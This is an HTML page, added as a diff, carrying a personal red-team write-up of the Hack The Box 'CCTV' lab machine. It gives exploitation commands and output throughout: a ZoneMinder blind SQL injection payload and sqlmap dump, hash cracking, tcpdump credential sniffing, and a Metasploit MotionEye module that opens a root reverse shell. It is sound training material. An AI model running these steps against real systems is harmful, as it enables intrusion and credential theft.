@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CCTV Writeup | Koussay Aydi</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="../styles.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <canvas id="particles-canvas"></canvas>
+    <div class="scroll-progress" id="scrollProgress"></div>
+    <header class="topbar">
+        <div class="brand">
+            <div class="brand-mark">KA</div>
+            <div class="brand-info">
+                <p class="brand-label">Koussay Aydi</p>
+                <span class="brand-subtitle">Red Team Writeup</span>
+            </div>
+        </div>
+        <nav class="main-nav">
+            <a href="../index.html">Back to Portfolio</a>
+        </nav>
+        <div class="topbar-actions">
+            <button id="mobileMenuBtn" class="icon-btn mobile-menu-btn" aria-label="Open mobile menu"><i class="fas fa-bars"></i></button>
+        </div>
+    </header>
+    <div class="mobile-nav" id="mobileNav" aria-hidden="true">
+            <a href="../index.html">Back to Portfolio</a>
+    </div>
+    <main class="page-shell">
+        <article class="panel writeup-content">
+            <span class="eyebrow">Hack The Box — CCTV Machine (Linux Medium)</span>
+            <h1>CCTV Writeup</h1>
+            <p><strong>Author:</strong> Atrox | <strong>Hostname:</strong> <code>cctv.htb</code> | <strong>OS:</strong> Ubuntu 24.04</p>
+
+    <hr>
+
+    <h2>Attack Path Overview</h2>
+    <pre><code>Recon → ZoneMinder SQLi (CVE-2024-51482) → Hash Crack → SSH as mark
+     → tcpdump credential sniff → su sa_mark
+     → SSH tunnel → MotionEye RCE (CVE-2025-60787) → root
+</code></pre>
+
+    <h2>1. Reconnaissance</h2>
+
+    <h3>Nmap</h3>
+    <pre><code class="language-bash">nmap -sC -sV -T4 -p- --open $ip_target</code></pre>
+
+    <p><strong>Results:</strong></p>
+    <table>
+        <thead>
+            <tr>
+                <th>Port</th>
+                <th>Service</th>
+                <th>Version</th>
+            </tr>
+        </thead>
+        <tbody>
+            <tr>
+                <td>22/tcp</td>
+                <td>SSH</td>
+                <td>OpenSSH 9.6p1 Ubuntu</td>
+            </tr>
+            <tr>
+                <td>80/tcp</td>
+                <td>HTTP</td>
+                <td>Apache 2.4.58</td>
+            </tr>
+        </tbody>
+    </table>
+    <ul>
+        <li>Hostname resolves to <code>cctv.htb</code></li>
+        <li>Web title: <strong>SecureVision CCTV &amp; Security Solutions</strong></li>
+    </ul>
+    <pre><code class="language-bash">echo "$ip_target cctv.htb" >> /etc/hosts</code></pre>
+
+    <h3>Web Fingerprinting</h3>
+    <p>Navigating to <code>http://cctv.htb</code> reveals a monitoring dashboard. The <strong>Staff Login</strong> link redirects to a <strong>ZoneMinder v1.37.63</strong> instance at <code>/zm/</code>.</p>
+    <blockquote>
+        <p>ZoneMinder is a known target due to its history of critical vulnerabilities in AJAX request handling.</p>
+    </blockquote>
+
+    <h2>2. Web Exploitation — CVE-2024-51482 (SQL Injection)</h2>
+
+    <h3>Vulnerability Analysis</h3>
+    <p>The file <code>web/ajax/event.php</code> fails to sanitize the <code>tid</code> parameter before using it in a secondary SQL query:</p>
+    <pre><code class="language-php">$sql = "SELECT * FROM Events_Tags WHERE TagId = $tagId";</code></pre>
+    <p>This results in a <strong>Time-Based Blind SQL Injection</strong> vulnerability.</p>
+    <p><strong>Vulnerable endpoint:</strong></p>
+    <pre><code>GET /zm/index.php?view=request&amp;request=event&amp;action=removetag&amp;tid=1</code></pre>
+
+    <h3>Step 1 — Obtain Authenticated Session</h3>
+    <p>ZoneMinder requires authentication. Login with default credentials (<code>admin:admin</code>) while handling the CSRF token:</p>
+    <pre><code class="language-bash"># Get CSRF token and login
+CSRF=$(curl -s -c cookies.txt "http://cctv.htb/zm/index.php?view=login" \
+  | grep -oP '(?<=csrfMagicToken = ")[^"]+')
+
+curl -s -b cookies.txt -c cookies.txt -X POST \
+  "http://cctv.htb/zm/index.php?view=login" \
+  -d "__csrf_magic=${CSRF}&amp;action=login&amp;username=admin&amp;password=admin" \
+  -L > /dev/null
+
+# Extract session cookie
+SESSION=$(grep ZMSESSID cookies.txt | awk '{print $NF}')
+echo "Session: $SESSION"</code></pre>
+
+    <h3>Step 2 — Create SQLmap Request File</h3>
+    <pre><code class="language-bash">cat > req.txt << EOF
+GET /zm/index.php?view=request&amp;request=event&amp;action=removetag&amp;tid=1 HTTP/1.1
+Host: cctv.htb
+User-Agent: Mozilla/5.0
+Accept: */*
+Cookie: ZMSESSID=${SESSION}; zmSkin=classic; zmCSS=base
+Connection: close
+
+EOF</code></pre>
+
+    <h3>Step 3 — Dump Credentials with SQLmap</h3>
+    <pre><code class="language-bash">sqlmap -r req.txt --batch -p "tid" \
+  --technique=T --time-sec=3 \
+  --dbms=mysql \
+  --dump -D zm -T Users -C Username,Password \
+  --where="Username='mark'" \
+  --threads=1</code></pre>
+
+    <p><strong>Result:</strong></p>
+    <pre><code>Database: zm
+Table: Users
++----------+--------------------------------------------------------------+
+| Username | Password                                                     |
++----------+--------------------------------------------------------------+
+| mark     | $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG. |
++----------+--------------------------------------------------------------+</code></pre>
+    <div class="note">
+        <p><strong>Note:</strong> Time-based blind SQLi on bcrypt hashes (60 chars) is slow. Expect 15–30 minutes. The injection was confirmed with payload: <code>tid=1 AND (SELECT 8166 FROM (SELECT(SLEEP(5)))pbHo)</code></p>
+    </div>
+
+    <h2>3. Hash Cracking</h2>
+    <p>The hash type is <strong>bcrypt</strong> (<code>$2y$10$</code>) — hashcat mode <code>3200</code>.</p>
+    <pre><code class="language-bash">echo '$2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG.' > hash.txt
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt</code></pre>
+
+    <p><strong>Cracked:</strong></p>
+    <pre><code>mark : opensesame</code></pre>
+
+    <h2>4. Initial Access — SSH as mark</h2>
+    <pre><code class="language-bash">ssh mark@cctv.htb
+# Password: opensesame</code></pre>
+
+    <h2>5. Lateral Movement — Network Credential Sniffing</h2>
+
+    <h3>Identify Docker Infrastructure</h3>
+    <pre><code class="language-bash">ip a
+# Multiple br- and veth interfaces confirm containerized CCTV stack</code></pre>
+
+    <h3>Capabilities Check</h3>
+    <pre><code class="language-bash">getcap -r / 2>/dev/null
+# tcpdump has cap_net_raw — allows packet capture as non-root</code></pre>
+
+    <h3>Sniff Internal Traffic</h3>
+    <pre><code class="language-bash">tcpdump -i any -nn -A tcp port 5000</code></pre>
+    <p>Shortly after, an automated request from <code>172.25.0.11</code> to the Flask service at <code>172.25.0.10:5000</code> reveals <strong>cleartext credentials</strong>:</p>
+    <pre><code>USERNAME=sa_mark;PASSWORD=X1l9fx1ZjS7RZb;CMD=disk-info</code></pre>
+
+    <h3>Pivot to sa_mark</h3>
+    <pre><code class="language-bash">su - sa_mark
+# Password: X1l9fx1ZjS7RZb</code></pre>
+
+    <h3>User Flag</h3>
+    <pre><code class="language-bash">cat ~/user.txt
+# &lt;user_flag&gt;</code></pre>
+
+    <h2>6. Privilege Escalation — MotionEye RCE (CVE-2025-60787)</h2>
+
+    <h3>Service Discovery</h3>
+    <p>In <code>sa_mark</code>'s home directory:</p>
+    <pre><code class="language-bash">ls ~
+# 'SecureVision Staff Announcement.pdf'  user.txt</code></pre>
+    <p>The PDF mentions: <em>"Staff logins will remain the same"</em> — hinting at <strong>credential reuse</strong>.</p>
+    <pre><code class="language-bash">ss -tulnp
+# Port 8765 is open locally — MotionEye web panel</code></pre>
+
+    <h3>SSH Tunnel</h3>
+    <p>From your Kali machine, forward port 8765:</p>
+    <pre><code class="language-bash">ssh -L 8765:127.0.0.1:8765 mark@cctv.htb
+# Password: opensesame</code></pre>
+    <p>Browse to <code>http://127.0.0.1:8765</code> — confirms <strong>MotionEye v0.43.1b4</strong>.</p>
+    <p>Login as <code>admin</code> with password <code>X1l9fx1ZjS7RZb</code> — <strong>successful</strong> (credential reuse confirmed).</p>
+
+    <h3>Vulnerability Analysis</h3>
+    <p>MotionEye is vulnerable to <strong>Command Injection</strong> (CVE-2025-60787). Fields like <code>image_file_name</code> and <code>movie_filename</code> in camera configs are written directly to files parsed by the <code>motion</code> process without sanitization.</p>
+
+    <h3>Exploitation with Metasploit</h3>
+    <pre><code class="language-bash">msfconsole -q -x "
+use exploit/linux/http/motioneye_auth_rce_cve_2025_60787;
+set RHOSTS 127.0.0.1;
+set RPORT 8765;
+set PASSWORD X1l9fx1ZjS7RZb;
+set LHOST tun0;
+run"</code></pre>
+    <p><strong>Output:</strong></p>
+    <pre><code>[+] The target appears to be vulnerable. Detected version 0.43.1b4
+[+] Camera successfully added
+[+] Exploit triggered, waiting for session...
+[*] Meterpreter session 1 opened
+meterpreter > getuid
+Server username: root
+</code></pre>
+
+    <h3>Root Flag</h3>
+    <pre><code class="language-bash">meterpreter > cat /root/root.txt
+# &lt;root_flag&gt;</code></pre>
+
+    <h2>7. Vulnerabilities Summary</h2>
+    <table>
+        <thead>
+            <tr>
+                <th>CVE</th>
+                <th>Component</th>
+                <th>Type</th>
+                <th>Impact</th>
+            </tr>
+        </thead>
+        <tbody>
+            <tr>
+                <td>CVE-2024-51482</td>
+                <td>ZoneMinder 1.37.63</td>
+                <td>Time-Based Blind SQLi</td>
+                <td>Credential Dump</td>
+            </tr>
+            <tr>
+                <td>CVE-2025-60787</td>
+                <td>MotionEye 0.43.1b4</td>
+                <td>Authenticated RCE</td>
+                <td>Root Shell</td>
+            </tr>
+            <tr>
+                <td>N/A</td>
+                <td>tcpdump cap_net_raw</td>
+                <td>Capability Misconfiguration</td>
+                <td>Credential Sniff</td>
+            </tr>
+            <tr>
+                <td>N/A</td>
+                <td>MotionEye admin panel</td>
+                <td>Credential Reuse</td>
+                <td>Auth Bypass</td>
+            </tr>
+        </tbody>
+    </table>
+
+    <h2>8. Key Takeaways</h2>
+    <ul>
+        <li><strong>Default credentials</strong> (<code>admin:admin</code>) on ZoneMinder gave initial access to the SQLi endpoint.</li>
+        <li><strong>Time-based blind SQLi</strong> is slow but reliable — always use <code>--technique=T</code> with <code>--time-sec</code> tuned to network latency.</li>
+        <li><strong>Docker bridge interfaces</strong> with unencrypted internal service communication is a critical misconfiguration — always encrypt inter-container traffic.</li>
+        <li><strong><code>cap_net_raw</code> capability</strong> on tcpdump allows non-root users to sniff all network traffic — dangerous in multi-tenant environments.</li>
+        <li><strong>Credential reuse</strong> across ZoneMinder → Flask service → MotionEye is a common pattern in HTB machines and real-world environments.</li>
+    </ul>
+
+            <div style="margin-top: 50px; text-align: center;">
+                <a href="../index.html" class="btn btn-primary"><i class="fas fa-arrow-left"></i> Return Home</a>
+            </div>
+        </article>
+    </main>
+    <script src="../script.js"></script>
+</body>
+</html>
